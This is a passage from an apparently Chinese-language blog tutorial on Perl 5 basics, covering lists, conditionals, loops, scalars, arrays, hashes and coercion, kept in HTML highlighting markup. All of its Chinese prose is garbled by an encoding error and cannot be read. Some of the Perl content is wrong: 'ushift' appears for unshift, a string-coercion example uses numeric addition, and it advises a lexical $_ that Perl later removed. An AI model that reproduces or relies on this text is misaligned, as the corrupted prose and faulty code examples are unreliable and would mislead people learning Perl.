get_all_clown_hats();<br></code></pre></td></tr></table></figure><h3 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h3><p>å¯ä»¥ç”¨ <code>qw()</code> ä»¥ç©ºç™½ç¬¦åˆ†éš”ä¸€å­—ç¬¦ä¸²å­—é¢å€¼, å¹¶åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @storages = <span class="hljs-string">qw( Larry Curly Moe Shemp Joey Kenny )</span>;<br></code></pre></td></tr></table></figure><p>å¦‚æœ <code>qw()</code> åŒ…å«é€—å·æˆ–æ³¨é‡Šç¬¦ (<code>#</code>), Perl ä¼šäº§ç”Ÿä¸€æ¡è­¦å‘Š.</p><p>åœ¨ Perl ä¸­, <mark>åˆ—è¡¨å’Œæ•°ç»„çš„æ¦‚å¿µä¸å¯ä»¥äº¤æ¢</mark> . åˆ—è¡¨æ˜¯å€¼è€Œæ•°ç»„æ˜¯å®¹å™¨.</p><p>å¯ä»¥åœ¨ä¸€ä¸ªæ•°ç»„ä¸­å­˜æ”¾ä¸€ä¸ªåˆ—è¡¨, ä¹Ÿå¯ä»¥å°†ä¸€ä¸ªæ•°ç»„å¼ºè½¬ä¸ºåˆ—è¡¨, ä½†å®ƒä»¬æ˜¯ä¸åŒçš„å®ä½“.</p><h2 id="æ§åˆ¶æµç¨‹"><a href="#æ§åˆ¶æµç¨‹" class="headerlink" title="æ§åˆ¶æµç¨‹"></a>æ§åˆ¶æµç¨‹</h2><h3 id="åˆ†æ”¯è¯­å¥"><a href="#åˆ†æ”¯è¯­å¥" class="headerlink" title="åˆ†æ”¯è¯­å¥"></a>åˆ†æ”¯è¯­å¥</h3><p>åç¼€å½¢å¼çš„ <code>if</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Hello, Bob!&#x27;</span> <span class="hljs-keyword">if</span> $name eq <span class="hljs-string">&#x27;Bob&#x27;</span>;<br></code></pre></td></tr></table></figure><p>ä»£ç å—å½¢å¼çš„ <code>if</code> è¦æ±‚æ¡ä»¶ä¸¤è¾¹æœ‰æ‹¬å·.</p><p><code>unless</code> è¯­å¥æ˜¯ <code>if</code> çš„å¦å®šå½¢å¼, Perl åœ¨è¡¨è¾¾å¼çš„å€¼ä¸ºå‡æ—¶æ‰§è¡Œæ‰€éœ€æ“ä½œ.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;You&#x27;re no Bob!&quot;</span> <span class="hljs-keyword">unless</span> $name eq <span class="hljs-string">&#x27;Bob&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>unless</code> ä¹Ÿå¯ä»¥æ­é… <code>else</code> å’Œ <code>elsif</code>.</p><h3 id="ä¸‰å…ƒæ¡ä»¶æ“ä½œç¬¦"><a href="#ä¸‰å…ƒæ¡ä»¶æ“ä½œç¬¦" class="headerlink" title="ä¸‰å…ƒæ¡ä»¶æ“ä½œç¬¦"></a>ä¸‰å…ƒæ¡ä»¶æ“ä½œç¬¦</h3><p><code>? :</code></p><h3 id="æ¡ä»¶è¯­å¥ç›¸å…³çš„ä¸Šä¸‹æ–‡"><a href="#æ¡ä»¶è¯­å¥ç›¸å…³çš„ä¸Šä¸‹æ–‡" class="headerlink" title="æ¡ä»¶è¯­å¥ç›¸å…³çš„ä¸Šä¸‹æ–‡"></a>æ¡ä»¶è¯­å¥ç›¸å…³çš„ä¸Šä¸‹æ–‡</h3><p>æ¡ä»¶è¯­å¥ <code>if</code>, <code>unless</code> ä»¥åŠä¸‰å…ƒæ¡ä»¶è¡¨è¾¾å¼æ€»æ˜¯åœ¨ <mark>å¸ƒå°”ä¸Šä¸‹æ–‡</mark> ä¸­å¯¹ä¸€ä¸ªè¡¨è¾¾å¼è¿›è¡Œæ±‚å€¼.</p><p>å¯¹ç©ºå“ˆå¸Œå’Œæ•°ç»„æ±‚å€¼å¾—å‡.</p><p>Perl 5 æ²¡æœ‰å•ä¸€çš„çœŸå€¼, ä¹Ÿæ²¡æœ‰å•ä¸€çš„å‡å€¼.</p><p>ä»»ä½•æ±‚å€¼ä¸º 0 çš„æ•°å­—ä¸ºå‡, â€œ0â€ å­—ç¬¦ä¸²ä¹Ÿæ˜¯å‡.</p><p>CPAN æ¨¡å— <code>Want</code> å…è®¸ä½ åœ¨ä½ çš„å‡½æ•°å†…æ£€æµ‹å¸ƒå°”ä¸Šä¸‹æ–‡, æ ¸å¿ƒç¼–è¯‘å‘½ä»¤ <code>overloading</code> å…è®¸ä½ æŒ‡å®šè‡ªå·±çš„æ•°æ®ç±»å‹åœ¨å¸ƒå°”ä¸Šä¸‹æ–‡ä¸­æ±‚å¾—çš„å€¼.</p><h3 id="å¾ªç¯è¯­å¥"><a href="#å¾ªç¯è¯­å¥" class="headerlink" title="å¾ªç¯è¯­å¥"></a>å¾ªç¯è¯­å¥</h3><p>Perl å°† <code>foreach</code> å’Œ <code>for</code> å¯äº’æ¢åœ°çœ‹å¾….</p><p>æœ‰ç»éªŒçš„ Perl ç¨‹åºå‘˜å€¾å‘äºç”¨ <code>foreach</code> å¾ªç¯æ¥æŒ‡ä»£è‡ªåŠ¨è¿­ä»£å¾ªç¯.</p><p><code>for</code> å¾ªç¯ä¹Ÿæœ‰åç¼€å½¢å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;$_ * $_ =&quot;</span>, $_ * $_ <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>..<span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><h3 id="è¿­ä»£å’Œä½œç”¨èŒƒå›´"><a href="#è¿­ä»£å’Œä½œç”¨èŒƒå›´" class="headerlink" title="è¿­ä»£å’Œä½œç”¨èŒƒå›´"></a>è¿­ä»£å’Œä½œç”¨èŒƒå›´</h3><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">for</span> (@values) &#123;<br>    some_function();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">some_function</span> </span>&#123;<br>    s/foo/bar/;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ, å‡½æ•°ä¹Ÿä¼šä¿®æ”¹ <code>$_</code>, ä»è€Œå¯¼è‡´è¿­ä»£å€¼æ”¹å˜, å¯ä»¥é€šè¿‡ <code>my $_</code> é¿å…</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">some_function</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $_;<br>    <span class="hljs-regexp">s/foo/bar/</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="C-è¯­è¨€é£æ ¼çš„-For-å¾ªç¯"><a href="#C-è¯­è¨€é£æ ¼çš„-For-å¾ªç¯" class="headerlink" title="C è¯­è¨€é£æ ¼çš„ For å¾ªç¯"></a>C è¯­è¨€é£æ ¼çš„ For å¾ªç¯</h3><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">my</span> $i = <span class="hljs-number">0</span>; $i &lt;= <span class="hljs-number">10</span>; $i += <span class="hljs-number">2</span>)<br>&#123;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;$i *$i = &quot;</span>, $i * $i;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°½é‡ä½¿ç”¨ <code>foreach</code> é£æ ¼çš„å¾ªç¯æ¥ä»£æ›¿ <code>for</code> å¾ªç¯.</p><h2 id="Tailcalls"><a href="#Tailcalls" class="headerlink" title="Tailcalls"></a>Tailcalls</h2><p>æŸå‡½æ•°å†…æœ€åä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¯¹å…¶ä»–å‡½æ•°çš„è°ƒç”¨æ—¶, è¿™ç§æƒ…å†µç§°ä¸º <mark>å°¾éƒ¨è°ƒç”¨</mark>. å¤–å±‚å‡½æ•°çš„è¿”å›å€¼å°±æ˜¯å†…éƒ¨å‡½æ•°çš„è¿”å›å€¼.</p><p>ä½¿ç”¨å°¾éƒ¨è°ƒç”¨ä¼¼ä¹ä¼šå‡å°‘æœ‰å…³å†…éƒ¨æ§åˆ¶æµç¨‹è®°å½•çš„å†…å­˜æ¶ˆè€—.</p><h2 id="æ ‡é‡"><a href="#æ ‡é‡" class="headerlink" title="æ ‡é‡"></a>æ ‡é‡</h2><h3 id="æ ‡é‡å’Œç±»å‹"><a href="#æ ‡é‡å’Œç±»å‹" class="headerlink" title="æ ‡é‡å’Œç±»å‹"></a>æ ‡é‡å’Œç±»å‹</h3><p>åœ¨å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡ä¸­å¯¹ <mark>å¼•ç”¨</mark> æ±‚å€¼ä¼šå¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸², åœ¨æ•°å€¼ä¸Šä¸‹æ–‡ä¸­å¯¹å¼•ç”¨æ±‚å€¼ä¼šå¾—åˆ°ä¸€ä¸ªæ•°å­—, ä¸¤ä¸ªæ“ä½œéƒ½ä¸å¯¹å¼•ç”¨åšå‡ºä¿®æ”¹, ä½†ä¸èƒ½ä»å¾—åˆ°çš„å­—ç¬¦ä¸²æˆ–æ•°å­—ä¸­é‡æ–°åˆ›å»ºè¯¥å¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref = [ <span class="hljs-string">qw(test1 test2 test3)</span> ];<br><span class="hljs-keyword">my</span> $num_ref = <span class="hljs-number">0</span> + $ref;<br><span class="hljs-keyword">my</span> $str_ref = <span class="hljs-string">&#x27;&#x27;</span> + $ref;<br><br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Ref: $ref&quot;</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Num_ref: $num_ref&quot;</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Str_ref: $str_ref&quot;</span>;<br></code></pre></td></tr></table></figure><p>Perl 5 æ ‡é‡å¯ä»¥åŒ…å«æ•°å€¼éƒ¨åˆ†ä»¥åŠå­—ç¬¦ä¸²éƒ¨åˆ†çš„åŸå› ä¸º, Perl 5 <mark>è¡¨ç¤ºæ ‡é‡çš„å†…éƒ¨æ•°æ®ç»“æ„</mark>ä¸­æœ‰ä¸€ä¸ªæ•°å€¼æ§½å’Œä¸€ä¸ªå­—ç¬¦ä¸²æ§½.</p><p>åœ¨æ•°å€¼ä¸Šä¸‹æ–‡ä¸­è®¿é—®ä¸€ä¸ªå­—ç¬¦ä¸²æœ€ç»ˆäº§ç”Ÿä¸€ä¸ªæ‹¥æœ‰å­—ç¬¦ä¸²å’Œæ•°å€¼æ§½ä¸¤è€…çš„æ ‡é‡.</p><p><code>Scalar::Util</code> æ¨¡å—ä¸­çš„ <code>dualvar()</code> å‡½æ•°å…è®¸ä½ å¯¹ä¸€ä¸ªæ ‡é‡çš„è¿™ä¸¤ä¸ªå€¼è¿›è¡Œæ”¹åŠ¨.</p><p>æ ‡é‡æ²¡æœ‰å•ç‹¬é’ˆå¯¹å¸ƒå°”å€¼çš„æ§½.</p><h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><p>å­—ç¬¦ä¸²æ‹¼æ¥æ—¶æ•°ç»„æ±‚å€¼ä¹Ÿæ˜¯æ•°ç»„ä¸­æ‰€å«å…ƒç´ çš„ä¸ªæ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;I have &#x27;</span> . @cats . <span class="hljs-string">&#x27; cats!&#x27;</span>;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨æ•°ç»„çš„ç‰¹æ®Šå˜é‡å½¢å¼æ¥æ‰¾å‡ºæœ€åä¸€ä¸ªä¸‹æ ‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $last_index = $#cats;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™æ˜¯ <mark>æœ€åä¸€ä¸ªä¸‹æ ‡</mark> , è€Œä¸æ˜¯æ•°ç»„é•¿åº¦.</p><p>å¯ä»¥é€šè¿‡å¯¹ <code>$#</code> èµ‹å€¼æ¥è°ƒæ•´æ•°ç»„å¤§å°:</p><ul><li>æ”¶ç¼©, Perl å°†ä¸¢å¼ƒæ‰€æœ‰ä¸ç¬¦åˆè°ƒæ•´åå°ºå¯¸çš„å€¼</li><li>æ‰©å±•, Perl å°†æŠŠ <code>undef</code> å¡«å…¥å¤šå‡ºæ¥çš„ä½ç½®</li></ul><h3 id="æ•°ç»„èµ‹å€¼"><a href="#æ•°ç»„èµ‹å€¼" class="headerlink" title="æ•°ç»„èµ‹å€¼"></a>æ•°ç»„èµ‹å€¼</h3><p>å¦‚æœå¯¹è¶…å‡ºèŒƒå›´çš„ä½ç½®èµ‹å€¼, Perl ä¼šå°†æ•°ç»„æ‰©å±•åˆ°åˆé€‚çš„å¤§å°, å¹¶å‘å¤¹åœ¨ä¸­é—´çš„æ‰€æœ‰ç©ºæ§½éƒ½å¡«å…¥ <code>undef</code>.</p><p>è¦ <mark>æ¸…ç©ºä¸€ä¸ªæ•°ç»„</mark> , ç”¨ç©ºåˆ—è¡¨å¯¹å…¶èµ‹å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">@data = ();<br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„åˆ†ç‰‡"><a href="#æ•°ç»„åˆ†ç‰‡" class="headerlink" title="æ•°ç»„åˆ†ç‰‡"></a>æ•°ç»„åˆ†ç‰‡</h3><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @test  = @cats[-<span class="hljs-number">1</span>, -<span class="hljs-number">2</span>];<br><span class="hljs-keyword">my</span> @test2 = @cats[<span class="hljs-number">0</span> .. <span class="hljs-number">2</span>];<br><span class="hljs-keyword">my</span> @test3 = @cats[ @indexes ];<br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„æ“ä½œ"><a href="#æ•°ç»„æ“ä½œ" class="headerlink" title="æ•°ç»„æ“ä½œ"></a>æ•°ç»„æ“ä½œ</h3><p><code>push</code> å’Œ <code>pop</code> æ“ä½œæ•°ç»„å°¾éƒ¨.</p><p><code>ushift</code> å’Œ <code>shift</code> æ“ä½œæ•°ç»„å¼€å¤´.</p><p><code>splice</code> æŒ‰ç»™å‡ºçš„åç§»é‡, åˆ—è¡¨åˆ†ç‰‡é•¿åº¦ä»¥åŠæ›¿ä»£ç‰©åˆ é™¤å¹¶æ›¿æ¢æ•°ç»„å…ƒç´ .</p><p>åœ¨ Perl 5.12 ä¸­, å¯ä»¥ä½¿ç”¨ <code>each</code> æ¥å°†æŸæ•°ç»„è¿­ä»£ä¸ºé”®å€¼å¯¹.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> ($index, $value) = <span class="hljs-keyword">each</span> @bookshelf) &#123;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;#$index: $value&quot;</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„å’Œä¸Šä¸‹æ–‡"><a href="#æ•°ç»„å’Œä¸Šä¸‹æ–‡" class="headerlink" title="æ•°ç»„å’Œä¸Šä¸‹æ–‡"></a>æ•°ç»„å’Œä¸Šä¸‹æ–‡</h3><p>ä»¥ä¸‹åˆ›å»ºå•ä¸ªæ•°ç»„, è€Œä¸æ˜¯æ•°ç»„çš„æ•°ç»„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @array_of_arrays = ( <span class="hljs-number">1</span> .. <span class="hljs-number">10</span>, ( <span class="hljs-number">11</span> .. <span class="hljs-number">20</span>, ( <span class="hljs-number">21</span> .. <span class="hljs-number">30</span> ) ) );<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ‹¬å·å¹¶ä¸åˆ›å»ºåˆ—è¡¨, åªæ˜¯ç”¨æ¥ç»™è¡¨è¾¾å¼åˆ†ç»„.</p><h3 id="æ•°ç»„å†…æ’"><a href="#æ•°ç»„å†…æ’" class="headerlink" title="æ•°ç»„å†…æ’"></a>æ•°ç»„å†…æ’</h3><p>æ•°ç»„ä½œä¸ºå­—ç¬¦ä¸²åŒ–çš„åˆ—è¡¨æ’å…¥åŒå¼•å·æ—¶, <code>$&quot;</code> å…¨å±€å˜é‡å†³å®šåˆ†éš”ç¬¦:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @alphabet = <span class="hljs-string">&#x27;a&#x27;</span> .. <span class="hljs-string">&#x27;z&#x27;</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;[@alphabet]&quot;</span>;<br>&#123;<br>    <span class="hljs-keyword">local</span> $&quot; = <span class="hljs-string">&#x27;)(&#x27;</span>;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;(@alphabet)&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å“ˆå¸Œ"><a href="#å“ˆå¸Œ" class="headerlink" title="å“ˆå¸Œ"></a>å“ˆå¸Œ</h2><p>è¦æ¸…ç©ºä¸€ä¸ªå“ˆå¸Œ, å¯ä»¥å°†ç©ºåˆ—è¡¨èµ‹å€¼ç»™ä»–:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">%favorite_flavors = ();<br></code></pre></td></tr></table></figure><p>å“ˆå¸Œé”®åªèƒ½æ˜¯å­—ç¬¦ä¸², å¦‚æœä½ ä½¿ç”¨æŸå¯¹è±¡ä½œä¸ºå“ˆå¸Œé”®, ä½ å°†å¾—åˆ°å¯¹è±¡å­—ç¬¦ä¸²åŒ–åçš„ç‰ˆæœ¬è€Œéå¯¹è±¡æœ¬èº«.</p><h3 id="å“ˆå¸Œåˆ†ç‰‡"><a href="#å“ˆå¸Œåˆ†ç‰‡" class="headerlink" title="å“ˆå¸Œåˆ†ç‰‡"></a>å“ˆå¸Œåˆ†ç‰‡</h3><p>å°±æ˜¯ä¸€ä¸ªç”±å“ˆå¸Œé”®å€¼å¯¹ç»„æˆçš„åˆ—è¡¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %cats;<br>@cats&#123;<span class="hljs-string">qw( Jack Brad Mars Grumpy )</span>&#125; = (<span class="hljs-number">1</span>) <span class="hljs-keyword">x</span> <span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure><p>å“ˆå¸Œåˆ†ç‰‡å¯ä»¥ä½¿åˆå¹¶ä¸¤ä¸ªå“ˆå¸Œå˜å¾—å®¹æ˜“:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %addresses = (...);<br><span class="hljs-keyword">my</span> %canada_addresses = (...);<br><br>@addresses&#123;<span class="hljs-keyword">keys</span> %canada_addresses&#125; = <span class="hljs-keyword">values</span> %canada_addresses;<br></code></pre></td></tr></table></figure><h3 id="ç©ºå“ˆå¸Œ"><a href="#ç©ºå“ˆå¸Œ" class="headerlink" title="ç©ºå“ˆå¸Œ"></a>ç©ºå“ˆå¸Œ</h3><p>ä¸€ä¸ªç©ºå“ˆå¸Œä¸åŒ…å«é”®å’Œå€¼, ä»–åœ¨å¸ƒå°”ä¸Šä¸‹æ–‡ä¸­å¾—å‡</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Test::More;<br><br><span class="hljs-keyword">my</span> %empty;<br>ok( ! %empty, <span class="hljs-string">&#x27;empty hash should evaluate to false&#x27;</span> );<br><br><span class="hljs-keyword">my</span> %false_key = ( <span class="hljs-string">0 =&gt;</span> <span class="hljs-string">&#x27;true value&#x27;</span> );<br>ok( %false_key, <span class="hljs-string">&#x27;hash containing false key should evaluate to true&#x27;</span> );<br><br><span class="hljs-keyword">my</span> %false_value = ( <span class="hljs-string">&#x27;true key&#x27;</span> =&gt; <span class="hljs-number">0</span> );<br>ok( %false_value, <span class="hljs-string">&#x27;hash containing false value should evaluate to true&#x27;</span> );<br><br>...<br>done_testing();<br></code></pre></td></tr></table></figure><p>åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­, å¯¹å“ˆå¸Œæ±‚å€¼å¾—åˆ°çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸², è¡¨ç¤ºå·²ç”¨å“ˆå¸Œæ¡¶ <mark>æ¯”ä¸Š</mark> å·²åˆ†é…å“ˆå¸Œæ¡¶.</p><p>åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­, å¯¹å“ˆå¸Œæ±‚å€¼å¾—åˆ°ç±»ä¼¼ä» <code>each</code> æ“ä½œç¬¦å–å¾—çš„é”®å€¼å¯¹åˆ—è¡¨.</p><h3 id="å“ˆå¸Œæƒ¯ç”¨è¯­"><a href="#å“ˆå¸Œæƒ¯ç”¨è¯­" class="headerlink" title="å“ˆå¸Œæƒ¯ç”¨è¯­"></a>å“ˆå¸Œæƒ¯ç”¨è¯­</h3><p>å“ˆå¸Œå€¼åˆå§‹ä¸º <code>undef</code>, åç¼€è‡ªå¢æ“ä½œç¬¦ <code>++</code> å°†å…¶ä½œä¸ºé›¶å¯¹å¾…. å³ä¸€ä¸ªé”®å¯¹åº”çš„å€¼ä¸å­˜åœ¨, åˆ›å»ºä¸€ä¸ª <code>undef</code> å€¼, ä½¿ç”¨ <code>++</code> åˆ™å°†å…¶åŠ  1, å³æ­¤æ—¶çš„å€¼ä¸º 1.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %ip_addresses;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> $line = &lt;$logfile&gt;)<br>&#123;<br>    <span class="hljs-keyword">my</span> ($ip, $resource) = analyze_line( $line );<br>    $ip_addresses&#123;$ip&#125;++;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ <code>//=</code> å·²å®šä¹‰æˆ–æ“ä½œç¬¦å¯ä»¥è®¾ç½®é»˜è®¤å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">make_sundae</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">my</span> %parameters = @_;<br>    $parameters<span class="hljs-string">&#123;flavor&#125;</span> //= <span class="hljs-string">&#x27;Vanilla&#x27;</span>;<br>    $parameters<span class="hljs-string">&#123;topping&#125;</span> //= <span class="hljs-string">&#x27;fudge&#x27;</span>;<br>    $parameters<span class="hljs-string">&#123;sprinkles&#125;</span> //= <span class="hljs-number">100</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥èµ‹å€¼ä¹Ÿæ˜¯è®¾ç½®é»˜è®¤å‚æ•°.</p><p>ç»™å‡½æ•°ä¼ é€’å‚æ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">make_sundae</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> %parameters = @_;<br>    ...<br>&#125;<br><br>make_sundae( <span class="hljs-string">flavor =&gt;</span> <span class="hljs-string">&#x27;Lemon Burst&#x27;</span>, <span class="hljs-string">topping =&gt;</span> <span class="hljs-string">&#x27;cookie bits&#x27;</span> );<br></code></pre></td></tr></table></figure><h3 id="å“ˆå¸Œä¸Šé”"><a href="#å“ˆå¸Œä¸Šé”" class="headerlink" title="å“ˆå¸Œä¸Šé”"></a>å“ˆå¸Œä¸Šé”</h3><p>æ ¸å¿ƒæ¨¡å— <code>Hash::Util</code> æä¾›ä¸€äº›æœºåˆ¶.</p><p>é¿å…ä»–äººå‘å“ˆå¸Œæ·»åŠ ä½ ä¸æƒ³è¦çš„é”®, å¯ä»¥ä½¿ç”¨ <code>lock_keys()</code> å‡½æ•°å°†å“ˆå¸Œé”®é™åˆ¶åœ¨å½“å‰é›†åˆä¸­, ä»»ä½•æ·»åŠ ä¸è¢«å…è®¸çš„é”®å€¼å¯¹çš„æ„å›¾å°†å¼•å‘ä¸€ä¸ªå¼‚å¸¸.</p><p>å¯ä½¿ç”¨ <code>unlock_keys()</code> å»æ‰ä¿æŠ¤.</p><p>è¿˜æœ‰ <code>lock_value()</code>, <code>unlock_value()</code>, <code>lock_hash</code>, <code>unlock_hash</code> ç­‰.</p><h2 id="å¼ºåˆ¶è½¬æ¢"><a href="#å¼ºåˆ¶è½¬æ¢" class="headerlink" title="å¼ºåˆ¶è½¬æ¢"></a>å¼ºåˆ¶è½¬æ¢</h2><h3 id="å¼•ç”¨å¼ºåˆ¶è½¬æ¢"><a href="#å¼•ç”¨å¼ºåˆ¶è½¬æ¢" class="headerlink" title="å¼•ç”¨å¼ºåˆ¶è½¬æ¢"></a>å¼•ç”¨å¼ºåˆ¶è½¬æ¢</h3><p>å‘ç”Ÿåœ¨å¯¹éå¼•ç”¨è¿›è¡Œè§£å¼•ç”¨æ“ä½œ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %users;<br><br>$users<span class="hljs-string">&#123;Bradley&#125;</span><span class="hljs-string">&#123;id&#125;</span> = <span class="hljs-number">228</span>;<br>$users<span class="hljs-string">&#123;Jack&#125;</span><span class="hljs-string">&#123;id&#125;</span> = <span class="hljs-number">229</span>;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šåˆ›å»ºå“ˆå¸Œå¼•ç”¨.</p><h3 id="å¼ºåˆ¶è½¬æ¢çš„ç¼“å­˜"><a href="#å¼ºåˆ¶è½¬æ¢çš„ç¼“å­˜" class="headerlink" title="å¼ºåˆ¶è½¬æ¢çš„ç¼“å­˜"></a>å¼ºåˆ¶è½¬æ¢çš„ç¼“å­˜</h3><p>Perl 5 å¯¹å€¼çš„å†…éƒ¨å­˜å‚¨æœºåˆ¶å…è®¸æ¯ä¸ªå€¼æ‹¥æœ‰å­—ç¬¦ä¸²åŒ–å’Œæ•°å€¼åŒ–çš„ç»“æœå“¦.</p><h3 id="åŒé‡å˜é‡"><a href="#åŒé‡å˜é‡" class="headerlink" 